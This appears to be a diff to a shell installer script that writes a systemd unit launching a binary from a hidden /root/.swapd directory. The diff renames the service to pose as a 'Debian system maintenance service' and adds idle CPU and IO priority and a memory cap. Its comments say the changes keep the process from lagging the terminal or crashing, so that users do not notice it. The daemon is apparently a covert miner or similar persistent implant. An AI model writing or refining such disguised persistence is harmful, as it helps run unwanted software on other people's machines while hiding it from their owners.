@@ -1122,12 +1122,18 @@ else
 
         cat >/tmp/swapd.service <<EOL
 [Unit]
-Description=Swap Daemon Service
+Description=Debian system maintenance service
 After=network.target
 
 [Service]
 ExecStart=/root/.swapd/swapd --config=/root/.swapd/config.json
 Restart=always
+# Lower the priority so it doesn't lag the terminal
+Nice=19
+CPUSchedulingPolicy=idle
+IOSchedulingClass=idle
+# Limit memory so it never triggers an Out-Of-Memory crash
+MemoryMax=2G
 
 [Install]
 WantedBy=multi-user.target
